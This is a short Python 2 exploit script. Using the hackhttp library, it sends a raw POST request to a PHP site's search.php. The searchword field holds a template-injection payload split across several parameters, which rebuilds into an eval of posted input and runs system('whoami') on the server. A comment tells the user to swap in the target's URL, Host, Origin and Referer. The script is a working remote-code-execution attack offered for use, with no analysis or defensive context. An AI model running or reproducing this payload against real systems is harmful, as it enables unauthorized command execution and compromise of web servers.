#coding = utf8

# Url , Host , Origin,Referer need change 

import hackhttp

Url = "http://127.0.0.1/upload/search.php"

raw = '''POST /search.php HTTP/1.1
Host: 127.0.0.1  
Proxy-Connection: keep-alive
Content-Length: 22
Cache-Control: max-age=0
Origin: http://127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: http://127.0.0.1/upload/search.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.8

searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&ver=OST[9]))&9[]=sys&9[]=tem('whoami');
'''

hh = hackhttp.hackhttp()

a,b,c,d,e = hh.http(url = Url ,raw = raw)

print c
